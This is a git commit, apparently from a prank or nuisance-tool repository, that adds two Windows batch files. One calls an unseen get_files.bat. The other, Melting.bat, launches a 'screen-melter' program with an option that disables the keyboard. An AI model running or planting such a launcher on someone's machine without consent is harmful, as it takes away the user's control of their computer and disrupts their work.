0f8eebd6ce58be06e067fe10b9236642da232619
CoolExploit <117057140+CoolExploit@users.noreply.github.com>
2023-05-03 23:22:01 -0800

    Add files via upload

---
+++ Error.bat
@@ -0,0 +1,5 @@
+cd C:\Users\Common\Files
+call get_files.bat
+if errorlevel 1 goto ERROR
+echo SUCCESSFUL
+exit /b 0...
---
+++ Melting.bat
@@ -0,0 +1,2 @@
+screen-melter.exe -M --disable_keyboard -t 20 --exit_time=10000
+screen-melter.exe -B "-t 2000 --exit_time=10000"
